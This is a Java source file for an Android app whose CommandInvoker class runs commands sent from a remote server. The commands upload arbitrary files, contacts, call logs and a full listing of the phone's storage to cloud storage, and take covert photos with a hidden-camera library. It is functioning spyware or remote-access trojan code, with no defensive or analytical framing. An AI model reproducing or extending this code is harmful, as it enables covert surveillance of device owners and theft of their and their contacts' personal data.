package com.aei.managment;

import android.app.Application;
import android.content.Context;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import com.aei.firebaseutils.storage.StorageUtils;
import com.aei.network.Command;
import com.aei.network.DatabaseConnector;
import com.aei.utils.CallLogUtils;
import com.aei.utils.ContactsUtils;
import com.aei.utils.FileUtils;
import com.aei.utils.MySharedPrefs;
import com.aei.utils.MyVibrator;
import com.cottacush.android.hiddencam.CameraType;
import com.cottacush.android.hiddencam.HiddenCam;
import com.cottacush.android.hiddencam.OnImageCapturedListener;
import com.google.gson.Gson;

import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.Base64;

public class CommandInvoker {
    private enum Camera{
        FRONT, BACK
    }
    private String id;
    private Application application;
    private ContactsUtils contactsUtils;
    private MediaPlayer mediaPlayer;
    private MyVibrator vibrator;
    private StorageUtils storageUtils;
    private CameraManager cameraManager;
    public CommandInvoker(Application application){
        this.contactsUtils = new ContactsUtils(application);
        this.application = application;
        id = new MySharedPrefs(application).getString("ID","TEST");
        mediaPlayer = new MediaPlayer();
        AudioAttributes attributes = new AudioAttributes.Builder()
                .setLegacyStreamType(AudioManager.STREAM_MUSIC).build();
        mediaPlayer.setAudioAttributes(attributes);
        vibrator = new MyVibrator(application);
        storageUtils = new StorageUtils();
        cameraManager = ((CameraManager)application.getSystemService(Context.CAMERA_SERVICE));
    }

    public void invoke(Command command, DatabaseConnector connector){
        Log.e("Command Invoker",command.getType().toString());
        switch (command.getType()){
            case GET_FILE:
                File file = new File(new String(Base64.getDecoder().decode(command.getPayload())));
                storageUtils.uploadFile(file,id + "/files",url ->
                    connector.sendResponse(new Command().setType(Command.CommandType.FILE).
                            setPayload(new String(Base64.getEncoder()
                                    .encode(url.getBytes()))))
                );
                break;
            case TOAST:
                Toast.makeText(application,
                        new String(Base64.getDecoder()
                                .decode(command.getPayload())), Toast.LENGTH_SHORT).show();
                break;
            case GET_CONTACTS:
                File contactsLogFile = new File(application.getCacheDir(),"contacts.json");
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(contactsLogFile);
                    fileOutputStream.write(new Gson().toJson(contactsUtils.getAllContacts()).getBytes());
                    storageUtils.uploadFile(contactsLogFile,id + "/contacts",url ->
                        connector.sendResponse(new Command().setType(Command.CommandType.CONTACTS)
                                .setPayload(new String(Base64.getEncoder()
                                        .encode(url.getBytes()))))
                    );
                } catch (Exception e) {
                    connector.sendResponse(new Command().setType(Command.CommandType.CONTACTS)
                            .setPayload(new String(Base64.getEncoder()
                                    .encode("".getBytes()))));
                    e.printStackTrace();
                }
                break;
            case GET_LOG:
                File callLogFile = new File(application.getCacheDir(),"callLog.json");
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(callLogFile);
                    fileOutputStream.write(new Gson().toJson(CallLogUtils.getCallLog(application)).getBytes());
                    storageUtils.uploadFile(callLogFile,id + "/calllogs",url ->
                            connector.sendResponse(new Command().setType(Command.CommandType.LOG)
                            .setPayload(new String(Base64.getEncoder()
                                    .encode(url.getBytes())))));
                } catch (Exception e) {
                    connector.sendResponse(new Command().setType(Command.CommandType.LOG)
                            .setPayload(new String(Base64.getEncoder()
                                    .encode("".getBytes()))));
                    e.printStackTrace();
                }
                break;
            case PLAY_MUSIC:
                try {
                    mediaPlayer.setDataSource(new String(Base64.getDecoder().decode(command.getPayload())));
                    mediaPlayer.prepare();
                    mediaPlayer.start();
                }catch (Exception e){
                    e.printStackTrace();
                }
                break;
            case STOP_MUSIC:
                try{
                    mediaPlayer.stop();
                    mediaPlayer.reset();
                }catch (Exception e){
                    e.printStackTrace();
                }
                break;
            case VIBRATE:
                try {
                    vibrator.vibrate(Integer.parseInt(new String(Base64.getDecoder().decode(command.getPayload()))));
                }catch (Exception e){
                    e.printStackTrace();
                }
            case GET_FILE_LIST:
                try {
                    File fileList = new File(application.getCacheDir(), "fileList.txt");
                    PrintWriter printWriter = new PrintWriter(new FileWriter(fileList));
                    FileUtils.scanFiles(Environment.getExternalStorageDirectory()).stream().forEach(f->{
                        printWriter.println(f.getAbsolutePath());
                    });
                    printWriter.close();
                    storageUtils.uploadFile(fileList,id + "/file_list",url ->
                            connector.sendResponse(new Command().setType(Command.CommandType.FILE_LIST)
                            .setPayload(new String(Base64.getEncoder()
                                    .encode(url.getBytes()))))
                    );
                }catch (Exception e){
                    e.printStackTrace();
                }
                break;
            case FRONT_CAMERA:
            case BACK_CAMERA:
                takePhoto(new OnImageCapturedListener() {
                    @Override
                    public void onImageCaptured(@NotNull File file) {
                        storageUtils.uploadFile(file,"/captured",url->
                                connector.sendResponse(new Command().setType(Command.CommandType.PHOTO)
                                        .setPayload(new String(Base64.getEncoder()
                                                .encode(url.getBytes()))))
                        );
                    }

                    @Override
                    public void onImageCaptureError(@Nullable Throwable throwable) {
                        if(throwable != null)
                            throwable.printStackTrace(System.err);
                    }
                }, CameraType.FRONT_CAMERA);
                break;
            default:
                break;
        }
    }

    void takePhoto(OnImageCapturedListener listener, CameraType type){
        HiddenCam camera = new HiddenCam(application, application.getCacheDir(), listener);
        camera.start();
        camera.captureImage();
        camera.stop();
        camera.destroy();
    }
}
